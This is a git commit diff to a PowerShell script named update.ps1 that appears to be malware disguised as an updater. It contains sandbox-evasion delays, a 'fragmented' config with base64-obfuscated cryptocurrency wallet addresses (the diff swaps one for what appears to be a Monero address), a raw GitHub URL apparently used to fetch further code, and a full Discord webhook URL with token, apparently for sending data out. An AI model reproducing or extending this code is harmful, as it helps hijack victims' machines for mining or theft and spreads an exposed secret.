9528a34c5b8389f700c25a47334f656d00dd2583
HolyV200 <gma12349090@gmail.com>
2026-05-08 22:06:43 +0300

    Add files via upload

--- update.ps1
+++ update.ps1
@@ -41,7 +41,7 @@ if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); r
 # === CONFIG (fragmented) ===
 $c = @{}
 $c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
-$c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YmMxcXZxMHJkMmcyOWczZHB2dzltdWUwcTNjNGN2bnN1eHZ3YzR0cXhy'))
+$c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ4M0cxQWdTMXBkc0xxenQzbkZRbUw4SFBGM0MyV1ZyTE1SQWRBVkdxeHo2aXBWM2FGOG5vN2NtRGtINHdNWno5WUQ1cU5VWjk2bkdMTUtwZHQ1clhacU13R2ZMYzM='))
 $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
 $c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"
 
